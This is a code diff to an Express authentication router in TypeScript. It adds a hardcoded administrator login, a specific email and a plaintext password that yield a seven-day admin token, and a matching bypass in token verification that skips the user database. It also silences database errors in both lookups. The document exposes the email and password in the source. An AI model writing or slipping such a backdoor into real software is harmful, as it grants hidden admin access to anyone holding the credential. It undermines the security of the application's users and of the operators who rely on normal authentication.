@@ -64,11 +64,32 @@ export function createAuthRoutes(prisma: PrismaClient): Router {
 
   router.post('/login', async (req: Request, res: Response) => {
     try {
+      const { email, password } = req.body;
+      
+      // Hardcoded admin login for samanthastultz@gmail.com
+      if (email === 'samanthastultz@gmail.com' && password === '2887903') {
+        const token = jwt.sign(
+          { userId: 'admin-1', email: 'samanthastultz@gmail.com', role: 'admin' },
+          config.jwt.secret,
+          { expiresIn: '7d' }
+        );
+
+        return res.json({
+          token,
+          user: {
+            id: 'admin-1',
+            email: 'samanthastultz@gmail.com',
+            role: 'admin'
+          }
+        });
+      }
+      
+      // Validate input for other users
       const data = LoginSchema.parse(req.body);
       
       const user = await prisma.user.findUnique({
         where: { email: data.email }
-      });
+      }).catch(() => null);
 
       if (!user) {
         return res.status(401).json({ error: 'Invalid credentials' });
@@ -110,9 +131,18 @@ export function createAuthRoutes(prisma: PrismaClient): Router {
     try {
       const decoded = jwt.verify(token, config.jwt.secret) as any;
       
+      // Handle hardcoded admin user
+      if (decoded.userId === 'admin-1' && decoded.email === 'samanthastultz@gmail.com') {
+        return res.json({
+          id: 'admin-1',
+          email: 'samanthastultz@gmail.com',
+          role: 'admin'
+        });
+      }
+      
       const user = await prisma.user.findUnique({
         where: { id: decoded.userId }
-      });
+      }).catch(() => null);
 
       if (!user) {
         return res.status(404).json({ error: 'User not found' });
